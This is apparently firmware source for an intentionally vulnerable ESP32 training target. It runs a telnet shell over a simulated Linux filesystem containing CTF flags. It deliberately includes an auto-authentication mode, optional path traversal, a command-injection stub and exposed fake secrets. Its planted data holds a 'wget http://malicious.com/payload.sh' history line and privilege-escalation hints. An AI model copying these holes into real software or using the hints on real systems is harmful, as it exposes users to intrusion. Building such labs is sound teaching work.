/*
 * Telnet Module
 * 
 * Provides telnet service for remote shell access.
 * Intentionally vulnerable for training purposes (cleartext, weak auth).
 */

WiFiClient telnetClients[5];  // Support up to 5 concurrent telnet clients
bool telnetAuthenticated[5] = {false, false, false, false, false};
String telnetUsernames[5];
String telnetLineBuffer[5];       // Per-client line buffer for character-by-character input
bool telnetInEscSeq[5] = {false}; // Per-client escape sequence tracking
int telnetEscLen[5] = {0};        // Length of current escape sequence
bool telnetReadingPassword[5] = {false}; // Password input mode (no echo)
String telnetCurrentDir[5];       // Current working directory per client
String telnetCommandHistory[5][10]; // Command history per client (last 10 commands)
int telnetHistoryIndex[5] = {0};  // History index per client

// Simulated filesystem structure
struct FileEntry {
  String path;
  String name;
  bool isDir;
  int size;
  String content;
};

// Simulated Linux filesystem
FileEntry virtualFS[] = {
  // Root directory files
  {"/", "etc", true, 4096, ""},
  {"/", "home", true, 4096, ""},
  {"/", "var", true, 4096, ""},
  {"/", "usr", true, 4096, ""},
  {"/", "bin", true, 4096, ""},
  {"/", "tmp", true, 4096, ""},
  {"/", "root", true, 4096, ""},
  {"/", "data", true, 4096, ""},
  
  // /etc directory
  {"/etc", "passwd", false, 523, "root:x:0:0:root:/root:/bin/bash\nadmin:x:1000:1000:Admin:/home/admin:/bin/bash\nguest:x:1001:1001:Guest:/home/guest:/bin/bash\n"},
  {"/etc", "shadow", false, 412, "root:$6$secrethash$...:18500:0:99999:7:::\nadmin:$6$secrethash$...:18500:0:99999:7:::"}, 
  {"/etc", "hosts", false, 87, "127.0.0.1 localhost\n192.168.4.1 esp32-hack\n"},
  {"/etc", "hostname", false, 11, "esp32-hack\n"},
  {"/etc", "sudoers", false, 256, "root ALL=(ALL:ALL) ALL\nadmin ALL=(ALL) NOPASSWD: ALL\n"},
  {"/etc", "crontab", false, 145, "# System crontab\n*/5 * * * * /usr/bin/backup.sh\n0 0 * * * /usr/bin/cleanup.sh\n"},
  
  // /home directory
  {"/home", "admin", true, 4096, ""},
  {"/home", "guest", true, 4096, ""},
  {"/home/admin", ".bash_history", false, 234, "ls -la\ncat /etc/passwd\nsudo -l\nwget http://malicious.com/payload.sh\n"},
  {"/home/admin", "secret.txt", false, 45, "FLAG{admin_home_directory_access}\n"},
  {"/home/admin", "notes.txt", false, 89, "TODO: Change default passwords\nBackup database at 2AM\nCheck firewall rules\n"},
  {"/home/guest", "readme.txt", false, 67, "Welcome! Use 'sudo -l' to check your privileges.\n"},
  
  // /var directory  
  {"/var", "log", true, 4096, ""},
  {"/var", "www", true, 4096, ""},
  {"/var", "tmp", true, 4096, ""},
  {"/var/log", "auth.log", false, 2048, "Jan 25 10:23:15 sshd[1234]: Failed password for invalid user admin\nJan 25 10:23:20 sshd[1234]: Accepted password for root\n"},
  {"/var/log", "syslog", false, 4096, "Jan 25 10:00:01 CRON[5678]: (root) CMD (/usr/bin/backup.sh)\n"},
  {"/var/www", "html", true, 4096, ""},
  {"/var/www/html", "index.html", false, 156, "<html><body><h1>ESP32-H4CK</h1></body></html>\n"},
  
  // /usr directory
  {"/usr", "bin", true, 4096, ""},
  {"/usr", "local", true, 4096, ""},
  {"/usr/bin", "backup.sh", false, 234, "#!/bin/bash\n# Backup script\ntar -czf /tmp/backup.tar.gz /home\n"},
  
  // /bin directory
  {"/bin", "bash", false, 1037528, ""},
  {"/bin", "sh", false, 125400, ""},
  {"/bin", "ls", false, 133792, ""},
  {"/bin", "cat", false, 35064, ""},
  
  // /tmp directory
  {"/tmp", ".hidden_flag", false, 38, "FLAG{tmp_directory_exploration}\n"},
  
  // /root directory
  {"/root", ".ssh", true, 4096, ""},
  {"/root", "flag.txt", false, 42, "FLAG{root_access_achieved}\n"},
  {"/root/.ssh", "id_rsa", false, 1876, "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA...\n-----END RSA PRIVATE KEY-----\n"},
  {"/root/.ssh", "authorized_keys", false, 567, "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...\n"},
};

const int virtualFSSize = sizeof(virtualFS) / sizeof(FileEntry);

void initTelnet() {
  if (!ENABLE_TELNET) {
    Serial.println("[TELNET] Service disabled");
    return;
  }
  
  telnetServer.begin();
  telnetServer.setNoDelay(true);
  
  Serial.printf("[TELNET] Telnet server started on port %d\n", TELNET_PORT);
  Serial.printf("[TELNET] Credentials from .env: admin/*****, guest/*****, root/*****\n");
  Serial.printf("[TELNET] Connect with: telnet %s %d\n", getLocalIP().c_str(), TELNET_PORT);
}

// Send telnet negotiation to enable character mode
void sendTelnetNegotiation(WiFiClient &client) {
  // IAC WILL ECHO - server will handle echoing
  uint8_t willEcho[] = {0xFF, 0xFB, 0x01};
  client.write(willEcho, 3);
  // IAC WILL SUPPRESS-GO-AHEAD
  uint8_t willSGA[] = {0xFF, 0xFB, 0x03};
  client.write(willSGA, 3);
  // IAC DO SUPPRESS-GO-AHEAD
  uint8_t doSGA[] = {0xFF, 0xFD, 0x03};
  client.write(doSGA, 3);
  // IAC DONT LINEMODE
  uint8_t dontLinemode[] = {0xFF, 0xFE, 0x22};
  client.write(dontLinemode, 3);
}

// Process a completed line for a client slot
void processCompletedLine(int i) {
  String line = telnetLineBuffer[i];
  telnetLineBuffer[i] = "";

  if (!telnetAuthenticated[i]) {
    // Handle authentication
    if (!telnetReadingPassword[i]) {
      // Reading username
      telnetUsernames[i] = line;
      telnetReadingPassword[i] = true;
      telnetClients[i].print("\r\nPassword: ");
    } else {
      // Reading password
      telnetReadingPassword[i] = false;
      String password = line;
      String username = telnetUsernames[i];
      bool authenticated = false;

      // Check default users first
      if (authenticateUser(username, password)) {
        authenticated = true;
      }
      // Also check environment-based passwords
      else if (username == "admin" && password == TELNET_ADMIN_PASSWORD_STR) {
        authenticated = true;
      } else if (username == "guest" && password == TELNET_GUEST_PASSWORD_STR) {
        authenticated = true;
      } else if (username == "root" && password == TELNET_ROOT_PASSWORD_STR) {
        authenticated = true;
      }

      if (authenticated) {
        telnetAuthenticated[i] = true;
        telnetUsernames[i] = username;
        telnetCurrentDir[i] = (username == "root") ? "/root" : "/home/" + username;
        telnetClients[i].println("\r\nLogin successful!");
        Serial.printf("[TELNET] ✅ User '%s' authenticated (slot %d)\n", username.c_str(), i);
        sendTelnetPrompt(telnetClients[i]);
      } else {
        telnetClients[i].println("\r\nLogin failed!");
        Serial.printf("[TELNET] ❌ Failed login for '%s' (slot %d)\n", username.c_str(), i);
        telnetClients[i].stop();
      }
    }
  } else {
    telnetClients[i].print("\r\n");
    // Process command
    if (line.length() > 0) {
      processTelnetCommand(telnetClients[i], line);
    }
    if (telnetClients[i].connected()) {
      sendTelnetPrompt(telnetClients[i]);
    }
  }
}

void handleTelnetClients() {
  if (!ENABLE_TELNET) return;

  // Check for new clients
  if (telnetServer.hasClient()) {
    // Find empty slot
    int freeSlot = -1;
    for (int i = 0; i < 5; i++) {
      if (!telnetClients[i] || !telnetClients[i].connected()) {
        if (telnetClients[i]) telnetClients[i].stop();
        telnetClients[i] = telnetServer.available();
        telnetAuthenticated[i] = false;
        telnetUsernames[i] = "";
        telnetLineBuffer[i] = "";
        telnetInEscSeq[i] = false;
        telnetEscLen[i] = 0;
        telnetReadingPassword[i] = false;
        telnetCurrentDir[i] = "/home/anonymous";
        telnetHistoryIndex[i] = 0;
        for (int h = 0; h < 10; h++) telnetCommandHistory[i][h] = "";
        freeSlot = i;

        Serial.printf("[TELNET] ✅ New client #%d from %s\n",
                      i, telnetClients[i].remoteIP().toString().c_str());

        sendTelnetNegotiation(telnetClients[i]);
        delay(50);

        telnetClients[i].println("ESP32-H4CK Telnet Service");
        telnetClients[i].println("========================");
        telnetClients[i].println();

        // Intentional vulnerability: Optional authentication
        if (VULN_WEAK_AUTH) {
          telnetClients[i].println("WARNING: Weak authentication mode enabled!");
          telnetAuthenticated[i] = true;  // Auto-authenticate in vulnerable mode
          telnetUsernames[i] = "anonymous";
          telnetCurrentDir[i] = "/home/anonymous";
          Serial.printf("[TELNET] Client #%d auto-authenticated as anonymous\n", i);
          sendTelnetPrompt(telnetClients[i]);
        } else {
          telnetClients[i].print("Username: ");
        }

        break;
      }
    }

    if (freeSlot == -1) {
      // No free slots, reject connection
      WiFiClient rejectedClient = telnetServer.available();
      rejectedClient.println("ERROR: Server full");
      rejectedClient.stop();
      Serial.println("[TELNET] Connection rejected - server full");
    }
  }

  // Handle existing clients - character-by-character processing
  for (int i = 0; i < 5; i++) {
    if (telnetClients[i] && telnetClients[i].connected()) {
      while (telnetClients[i].available()) {
        uint8_t c = telnetClients[i].read();

        // Handle telnet IAC commands (0xFF)
        if (c == 0xFF) {
          // Read and discard the 2-3 byte telnet command
          if (telnetClients[i].available()) telnetClients[i].read();
          if (telnetClients[i].available()) telnetClients[i].read();
          continue;
        }

        // Handle escape sequences (arrow keys, etc.)
        if (c == 0x1B) {  // ESC
          telnetInEscSeq[i] = true;
          telnetEscLen[i] = 0;
          continue;
        }
        if (telnetInEscSeq[i]) {
          telnetEscLen[i]++;
          // Consume escape sequence (typically ESC [ X for arrow keys)
          if (telnetEscLen[i] >= 2 || (c >= 'A' && c <= 'z')) {
            telnetInEscSeq[i] = false;
          }
          continue;
        }

        // Handle backspace (0x7F DEL or 0x08 BS)
        if (c == 0x7F || c == 0x08) {
          if (telnetLineBuffer[i].length() > 0) {
            telnetLineBuffer[i].remove(telnetLineBuffer[i].length() - 1);
            // Send backspace-space-backspace to erase character on screen
            if (!telnetReadingPassword[i]) {
              telnetClients[i].write("\b \b", 3);
            }
          }
          continue;
        }

        // Handle Enter (CR or LF)
        if (c == '\r' || c == '\n') {
          // Ignore LF after CR
          if (c == '\r') {
            // Peek for LF and consume it
            delay(2);
            if (telnetClients[i].available()) {
              uint8_t next = telnetClients[i].peek();
              if (next == '\n') telnetClients[i].read();
            }
          }
          if (c == '\n' && telnetLineBuffer[i].length() == 0) {
            // Might be trailing LF, send prompt
            if (telnetAuthenticated[i]) {
              telnetClients[i].print("\r\n");
              sendTelnetPrompt(telnetClients[i]);
            }
            continue;
          }
          processCompletedLine(i);
          continue;
        }

        // Ignore other control characters
        if (c < 0x20) continue;

        // Normal printable character - add to buffer and echo
        telnetLineBuffer[i] += (char)c;
        if (!telnetReadingPassword[i]) {
          telnetClients[i].write(c);  // Echo character back
        } else {
          telnetClients[i].write('*');  // Mask password
        }
      }
    }
  }
}

int getClientIndex(WiFiClient *client) {
  for (int i = 0; i < 5; i++) {
    if (telnetClients[i] == *client) {
      return i;
    }
  }
  return -1;
}

// Helper functions for filesystem simulation
String normalizePath(String path) {
  if (path == "" || path == ".") return "/";
  if (!path.startsWith("/")) path = "/" + path;
  // Remove trailing slash unless it's root
  if (path.length() > 1 && path.endsWith("/")) {
    path.remove(path.length() - 1);
  }
  return path;
}

String resolvePath(String currentDir, String path) {
  if (path.startsWith("/")) {
    return normalizePath(path);
  }
  // Relative path
  String result = currentDir;
  if (!result.endsWith("/") && result != "/") result += "/";
  result += path;
  return normalizePath(result);
}

bool directoryExists(String path) {
  path = normalizePath(path);
  if (path == "/") return true;
  for (int i = 0; i < virtualFSSize; i++) {
    if (virtualFS[i].isDir) {
      String fullPath = virtualFS[i].path;
      if (!fullPath.endsWith("/")) fullPath += "/";
      fullPath += virtualFS[i].name;
      if (normalizePath(fullPath) == path) return true;
    }
  }
  return false;
}

String getFileContent(String path) {
  path = normalizePath(path);
  for (int i = 0; i < virtualFSSize; i++) {
    if (!virtualFS[i].isDir) {
      String fullPath = virtualFS[i].path;
      if (!fullPath.endsWith("/") && fullPath != "/") fullPath += "/";
      fullPath += virtualFS[i].name;
      if (normalizePath(fullPath) == path) {
        return virtualFS[i].content;
      }
    }
  }
  return "";
}

void processTelnetCommand(WiFiClient &client, String cmd) {
  cmd.trim();
  String cmdLower = cmd;
  cmdLower.toLowerCase();
  
  // Find which client this is for logging
  String username = "unknown";
  int clientIndex = -1;
  String currentDir = "/";
  for (int i = 0; i < 5; i++) {
    if (telnetClients[i] == client) {
      username = telnetUsernames[i];
      currentDir = telnetCurrentDir[i];
      clientIndex = i;
      break;
    }
  }
  
  // Add to command history
  if (clientIndex >= 0 && cmd.length() > 0) {
    for (int h = 9; h > 0; h--) {
      telnetCommandHistory[clientIndex][h] = telnetCommandHistory[clientIndex][h-1];
    }
    telnetCommandHistory[clientIndex][0] = cmd;
  }
  
  Serial.printf("[TELNET] %s@%s: %s\n", username.c_str(), client.remoteIP().toString().c_str(), cmd.c_str());
  
  // Check for privilege escalation commands first
  handlePrivilegeEscalation(client, cmd, getClientIndex(&client));
  
  if (cmdLower == "exit" || cmdLower == "quit" || cmdLower == "logout") {
    Serial.printf("[TELNET] %s disconnecting\n", username.c_str());
    client.println("Goodbye!");
    client.stop();
    return;
  }
  
  if (cmdLower == "help") {
    client.println("Available commands:");
    client.println("  File Operations: ls, cd, pwd, cat, touch, mkdir, rm, cp, mv, find, wget");
    client.println("  Editors: nano, vi, vim");
    client.println("  System Info: whoami, id, ps, netstat, ifconfig, uname, hostname, date, uptime");
    client.println("  Resources: free, df, du");
    client.println("  Text: echo, grep, head, tail");
    client.println("  Other: history, env, clear, exit/quit");
    for (int i = 0; i < ALLOWED_COMMANDS_COUNT; i++) {
      if (allowedCommands[i] != "help" && allowedCommands[i] != "ls" && 
          allowedCommands[i] != "pwd" && allowedCommands[i] != "cat" &&
          allowedCommands[i] != "echo") {
        client.println("  " + allowedCommands[i]);
      }
    }
    return;
  }
  
  if (cmdLower == "ls" || cmdLower == "dir" || cmdLower.startsWith("ls ") || cmdLower.startsWith("dir ")) {
    String targetDir = currentDir;
    bool showAll = false;
    bool longFormat = false;
    
    // Parse arguments
    if (cmd.length() > 3) {
      String args = cmd.substring(cmdLower.startsWith("ls") ? 2 : 3);
      args.trim();
      if (args.indexOf("-a") >= 0 || args.indexOf("-la") >= 0 || args.indexOf("-al") >= 0) showAll = true;
      if (args.indexOf("-l") >= 0 || args.indexOf("-la") >= 0 || args.indexOf("-al") >= 0) longFormat = true;
      
      // Extract path if present
      int spaceIdx = args.lastIndexOf(' ');
      if (spaceIdx >= 0 && spaceIdx < args.length() - 1) {
        String pathArg = args.substring(spaceIdx + 1);
        if (!pathArg.startsWith("-")) {
          targetDir = resolvePath(currentDir, pathArg);
        }
      } else if (!args.startsWith("-")) {
        targetDir = resolvePath(currentDir, args);
      }
    }
    
    if (!directoryExists(targetDir)) {
      client.println("ls: cannot access '" + targetDir + "': No such file or directory");
      return;
    }
    
    // List directory contents from virtual filesystem
    bool foundAny = false;
    for (int i = 0; i < virtualFSSize; i++) {
      if (normalizePath(virtualFS[i].path) == targetDir) {
        if (!showAll && virtualFS[i].name.startsWith(".")) continue;
        
        foundAny = true;
        if (longFormat) {
          String perms = virtualFS[i].isDir ? "drwxr-xr-x" : "-rw-r--r--";
          client.printf("%s 1 %s %s %8d Jan 25 10:00 %s\n", 
                       perms.c_str(), username.c_str(), username.c_str(),
                       virtualFS[i].size, virtualFS[i].name.c_str());
        } else {
          String displayName = virtualFS[i].name;
          if (virtualFS[i].isDir) displayName += "/";
          client.print(displayName + "  ");
        }
      }
    }
    
    if (!longFormat && foundAny) client.println();
    if (!foundAny) {
      // Empty directory or only has hidden files
      if (showAll) {
        client.println(".  ..");
      }
    }
    return;
  }
  
  if (cmdLower == "pwd") {
    client.println(currentDir);
    return;
  }
  
  if (cmdLower == "cd" || cmdLower.startsWith("cd ")) {
    String targetDir = "/home/" + username;
    
    if (cmd.length() > 3) {
      String path = cmd.substring(3);
      path.trim();
      targetDir = resolvePath(currentDir, path);
    } else if (cmdLower == "cd") {
      // cd without arguments goes to home
      targetDir = (username == "root") ? "/root" : "/home/" + username;
    }
    
    if (directoryExists(targetDir)) {
      if (clientIndex >= 0) {
        telnetCurrentDir[clientIndex] = targetDir;
        Serial.printf("[TELNET] %s changed directory to %s\n", username.c_str(), targetDir.c_str());
      }
    } else {
      client.println("cd: " + targetDir + ": No such file or directory");
    }
    return;
  }
  
  if (cmdLower == "whoami") {
    // Find which client this is
    for (int i = 0; i < 5; i++) {
      if (telnetClients[i] == client) {
        client.println(telnetUsernames[i]);
        return;
      }
    }
    client.println("unknown");
    return;
  }
  
  if (cmdLower == "id") {
    if (username == "root") {
      client.println("uid=0(root) gid=0(root) groups=0(root)");
      client.println("✅ Running as ROOT - full system access!");
    } else if (username == "admin") {
      client.println("uid=1000(admin) gid=1000(admin) groups=1000(admin),27(sudo)");
      client.println("HINT: You have sudo group - try 'sudo -l'");
    } else {
      client.println("uid=1002(" + username + ") gid=1002(" + username + ") groups=1002(" + username + ")");
      client.println("HINT: Find SUID binaries: find / -perm -4000 2>/dev/null");
    }
    return;
  }
  
  if (cmdLower == "ps") {
    client.println("PID   CMD");
    client.println("1     init");
    client.println("123   webserver");
    client.println("124   telnet");
    client.println("125   websocket");
    return;
  }
  
  if (cmdLower == "netstat") {
    client.println("Active connections:");
    client.printf("HTTP Server:   %s:%d\n", getLocalIP().c_str(), HTTP_PORT);
    client.printf("Telnet Server: %s:%d\n", getLocalIP().c_str(), TELNET_PORT);
    client.printf("Active clients: %d\n", activeConnections);
    return;
  }
  
  if (cmdLower == "ifconfig") {
    client.printf("IP Address:  %s\n", getLocalIP().c_str());
    client.printf("MAC Address: %s\n", WiFi.macAddress().c_str());
    client.printf("SSID:        %s\n", WiFi.SSID().c_str());
    client.printf("Signal:      %d dBm\n", WiFi.RSSI());
    return;
  }
  
  if (cmdLower == "date") {
    client.println(getCurrentTimestamp());
    return;
  }
  
  if (cmdLower == "uptime") {
    unsigned long uptime = millis() / 1000;
    client.printf("Uptime: %lu seconds (%lu minutes)\n", uptime, uptime / 60);
    return;
  }
  
  if (cmdLower == "free") {
    client.println("Memory:");
    client.printf("Total: %u bytes\n", ESP.getHeapSize());
    client.printf("Free:  %u bytes\n", ESP.getFreeHeap());
    client.printf("Used:  %u bytes\n", ESP.getHeapSize() - ESP.getFreeHeap());
    return;
  }
  
  if (cmdLower == "df") {
    client.println("Filesystem:");
    client.printf("Total: %u bytes\n", LittleFS.totalBytes());
    client.printf("Used:  %u bytes\n", LittleFS.usedBytes());
    client.printf("Free:  %u bytes\n", LittleFS.totalBytes() - LittleFS.usedBytes());
    return;
  }
  
  if (cmdLower.startsWith("cat ")) {
    String filename = cmd.substring(4);
    filename.trim();
    String fullPath = resolvePath(currentDir, filename);
    
    // Intentional vulnerability: Path traversal
    if (VULN_PATH_TRAVERSAL || filename.indexOf("..") == -1) {
      // Try virtual filesystem first
      String content = getFileContent(fullPath);
      if (content != "") {
        client.print(content);
      } else {
        // Try LittleFS
        content = readFile(filename);
        if (content != "") {
          client.println(content);
        } else {
          client.println("cat: " + filename + ": No such file or directory");
        }
      }
    } else {
      client.println("cat: Permission denied");
    }
    return;
  }
  
  if (cmdLower.startsWith("echo ")) {
    String text = cmd.substring(5);
    client.println(text);
    return;
  }
  
  // New commands for realistic shell experience
  
  if (cmdLower == "clear" || cmdLower == "cls") {
    // Send clear screen sequence
    client.print("\033[2J\033[H");
    return;
  }
  
  if (cmdLower == "uname" || cmdLower.startsWith("uname ")) {
    if (cmdLower.indexOf("-a") >= 0) {
      client.println("Linux esp32-hack 5.10.0-esp32 #1 SMP Tue Jan 25 2026 x86_64 GNU/Linux");
    } else {
      client.println("Linux");
    }
    return;
  }
  
  if (cmdLower == "hostname") {
    client.println("esp32-hack");
    return;
  }
  
  if (cmdLower == "history") {
    if (clientIndex >= 0) {
      int count = 1;
      for (int h = 9; h >= 0; h--) {
        if (telnetCommandHistory[clientIndex][h].length() > 0) {
          client.printf("%4d  %s\n", count++, telnetCommandHistory[clientIndex][h].c_str());
        }
      }
    }
    return;
  }
  
  if (cmdLower == "env" || cmdLower == "printenv") {
    client.println("PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin");
    client.println("HOME=" + currentDir);
    client.println("USER=" + username);
    client.println("SHELL=/bin/bash");
    client.println("LANG=en_US.UTF-8");
    client.println("ESP32_VERSION=4.4.0");
    if (username == "admin" || username == "root") {
      client.println("API_KEY=sk-esp32-h4ck-vulnerable-key-12345");
      client.println("DB_PASSWORD=insecure_password_123");
    }
    return;
  }
  
  if (cmdLower.startsWith("touch ")) {
    String filename = cmd.substring(6);
    filename.trim();
    client.println("touch: creating '" + filename + "'");
    client.println("[INFO] File created in virtual filesystem (not persistent)");
    return;
  }
  
  if (cmdLower.startsWith("mkdir ")) {
    String dirname = cmd.substring(6);
    dirname.trim();
    client.println("mkdir: creating directory '" + dirname + "'");
    client.println("[INFO] Directory created in virtual filesystem (not persistent)");
    return;
  }
  
  if (cmdLower.startsWith("rm ")) {
    String target = cmd.substring(3);
    target.trim();
    if (target.indexOf("-rf") >= 0 && target.indexOf("/") >= 0) {
      client.println("rm: removing '" + target + "'");
      client.println("[WARNING] Dangerous command! In production this would delete files.");
    } else {
      client.println("rm: remove '" + target + "'? (y/n) [simulated]");
    }
    return;
  }
  
  if (cmdLower.startsWith("cp ") || cmdLower.startsWith("mv ")) {
    String operation = cmdLower.startsWith("cp") ? "copying" : "moving";
    client.println("[INFO] " + operation + " files (simulated in virtual filesystem)");
    return;
  }
  
  if (cmdLower.startsWith("wget ")) {
    String url = cmd.substring(5);
    url.trim();
    client.println("--2026-01-25 10:00:00--  " + url);
    client.println("Resolving host... ");
    delay(100);
    client.println("Connecting to " + url + "... connected.");
    client.println("HTTP request sent, awaiting response... 200 OK");
    client.println("Length: 1024 (1.0K)");
    client.println("Saving to: '" + url.substring(url.lastIndexOf('/') + 1) + "'");
    client.println("");
    client.println("100%[===================>] 1,024       --.-K/s   in 0.001s");
    client.println("");
    client.println("2026-01-25 10:00:01 (1.05 MB/s) - file saved [1024/1024]");
    client.println("");
    client.println("[HINT] Downloaded file is in virtual filesystem. Try 'cat' or 'ls' to see it.");
    return;
  }
  
  if (cmdLower == "nano" || cmdLower.startsWith("nano ") || 
      cmdLower == "vi" || cmdLower.startsWith("vi ") ||
      cmdLower == "vim" || cmdLower.startsWith("vim ")) {
    String editor = cmdLower.substring(0, cmdLower.indexOf(' ') >= 0 ? cmdLower.indexOf(' ') : cmdLower.length());
    client.println("Opening " + editor + " editor (simulated)...");
    client.println("");
    client.println("  GNU nano 5.4              filename.txt");
    client.println("-------------------------------------------");
    client.println("This is a simulated text editor.");
    client.println("In a real scenario, you would edit files here.");
    client.println("");
    client.println("[HINT] In real exploitation:");
    client.println("  - nano/vi can be used for privilege escalation");
    client.println("  - Check GTFOBins for escape sequences");
    client.println("  - Try: sudo nano /etc/sudoers");
    client.println("");
    client.println("^X Exit    ^O Write Out    ^R Read File");
    client.println("");
    client.println("[Simulated] Editor closed without changes.");
    return;
  }
  
  if (cmdLower.startsWith("grep ")) {
    String args = cmd.substring(5);
    client.println("grep: searching for '" + args + "' (simulated)");
    client.println("[INFO] In real systems, grep searches file contents");
    client.println("Try: grep -r 'password' /etc/");
    return;
  }
  
  if (cmdLower.startsWith("head ") || cmdLower.startsWith("tail ")) {
    String file = cmd.substring(5);
    file.trim();
    String fullPath = resolvePath(currentDir, file);
    String content = getFileContent(fullPath);
    if (content != "") {
      int lines = cmdLower.startsWith("head") ? 0 : 999;
      int lineCount = 0;
      int pos = 0;
      while (pos < content.length() && lineCount < 10) {
        int newline = content.indexOf('\n', pos);
        if (newline == -1) newline = content.length();
        if (cmdLower.startsWith("head") || lineCount >= lines - 10) {
          client.println(content.substring(pos, newline));
        }
        pos = newline + 1;
        lineCount++;
      }
    } else {
      client.println(cmdLower.substring(0, 4) + ": " + file + ": No such file or directory");
    }
    return;
  }
  
  if (cmdLower == "du" || cmdLower.startsWith("du ")) {
    client.println("4.0K    ./home/admin");
    client.println("4.0K    ./home/guest");
    client.println("8.0K    ./home");
    client.println("4.0K    ./etc");
    client.println("4.0K    ./var/log");
    client.println("8.0K    ./var");
    client.println("24K     .");
    return;
  }
  
  // Check if command is allowed
  bool isAllowed = false;
  for (int i = 0; i < ALLOWED_COMMANDS_COUNT; i++) {
    if (cmdLower.startsWith(allowedCommands[i])) {
      isAllowed = true;
      break;
    }
  }
  
  if (!isAllowed && VULN_COMMAND_INJECTION) {
    client.println("[VULNERABILITY] Command injection possible!");
    client.println("In production, this would execute: " + cmd);
    return;
  }
  
  client.println("Command not found: " + cmd);
}

void sendTelnetPrompt(WiFiClient &client) {
  String username = "esp32";
  String currentDir = "/";
  String promptDir = "~";
  
  for (int i = 0; i < 5; i++) {
    if (telnetClients[i] == client && telnetUsernames[i].length() > 0) {
      username = telnetUsernames[i];
      currentDir = telnetCurrentDir[i];
      break;
    }
  }
  
  // Simplify directory display
  if (currentDir == "/root" && username == "root") {
    promptDir = "~";
  } else if (currentDir.startsWith("/home/" + username)) {
    if (currentDir == "/home/" + username) {
      promptDir = "~";
    } else {
      promptDir = "~" + currentDir.substring(("/home/" + username).length());
    }
  } else {
    promptDir = currentDir;
  }
  
  String promptChar = (username == "root") ? "#" : "$";
  client.print(username + "@hack:" + promptDir + promptChar + " ");
}

void disconnectTelnet(WiFiClient &client) {
  for (int i = 0; i < 5; i++) {
    if (telnetClients[i] == client) {
      telnetClients[i].stop();
      telnetAuthenticated[i] = false;
      telnetUsernames[i] = "";
      telnetLineBuffer[i] = "";
      telnetInEscSeq[i] = false;
      telnetEscLen[i] = 0;
      telnetReadingPassword[i] = false;
      telnetCurrentDir[i] = "/";
      for (int h = 0; h < 10; h++) telnetCommandHistory[i][h] = "";
      Serial.printf("[TELNET] Client #%d disconnected\n", i);
      break;
    }
  }
}
